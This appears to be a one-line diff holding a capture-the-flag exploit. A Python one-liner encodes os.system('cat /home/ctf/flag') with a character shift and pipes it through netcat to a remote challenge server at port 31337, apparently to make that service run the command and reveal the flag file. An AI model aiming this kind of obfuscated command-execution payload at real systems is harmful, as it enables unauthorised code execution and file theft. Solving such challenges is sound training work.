@@ -1,0 +1,1 @@
+python -c 'f=lambda s : "".join([chr(ord(c)-3) for c in s]); print(f("os.system(\"cat /home/ctf/flag\")"))' | nc 141.85.224.101 31337
